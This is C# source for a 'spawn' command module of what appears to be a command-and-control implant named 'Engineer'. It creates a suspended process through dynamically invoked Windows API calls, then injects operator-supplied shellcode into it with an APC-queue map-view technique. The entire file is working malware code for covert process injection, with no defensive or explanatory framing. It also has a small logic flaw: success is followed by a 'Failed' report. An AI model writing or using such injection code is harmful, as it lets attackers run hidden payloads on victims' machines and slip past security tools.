using System;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using DynamicEngLoading;
using Engineer.Extra;

using static DynamicEngLoading.h_DynInv.Win32;

namespace Engineer.Commands
{
    internal unsafe class Spawn : EngineerCommand
    {
        public override string Name => "spawn";
        public override async Task Execute(EngineerTask task)
        {
            //get some variuables ready for spawning process
            var si = new ProcessThreadsAPI._STARTUPINFOEX();
            si.StartupInfo.cb = Marshal.SizeOf(si);
            var pi = new ProcessThreadsAPI._PROCESS_INFORMATION();
            var pa = new WinBase._SECURITY_ATTRIBUTES();
            pa.nLength = Marshal.SizeOf(pa);
            var ta = new WinBase._SECURITY_ATTRIBUTES();
            ta.nLength = Marshal.SizeOf(ta);

            if(task.File.Length < 1)
            {
                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("error: " + "No shellcode provided", task, EngTaskStatus.FailedWithWarnings,TaskResponseType.String);
                return;
            }
            //convert from base64 string to byte array
            byte[] shellcode = task.File;

            // spawn new process 
            ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("Creating new process", task, EngTaskStatus.Running,TaskResponseType.String);
            //dynamic invoke for CreateProcess 
           bool spawneed = h_DynInv_Methods.Ker32FuncWrapper.CreateProcessW($@"{SpawnTo.spawnToPath}", null, ref pa, ref ta, false, (uint)0x4, IntPtr.Zero, "C:\\Windows\\System32", ref si, out pi);
            if (spawneed)
            {
                if (Inj_techs.MapViewAPCResumeThread(shellcode, pi.hProcess, pi.hThread))
                {
                    ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("Shellcode Spawned", task, EngTaskStatus.Complete, TaskResponseType.String);
                }
                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("error: " + "Failed to Spawn Shellcode", task, EngTaskStatus.Failed, TaskResponseType.String);
            }
            else
                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("error: " + "Failed to Spawn Process", task, EngTaskStatus.Failed, TaskResponseType.String);
            
        }
        
    }
}
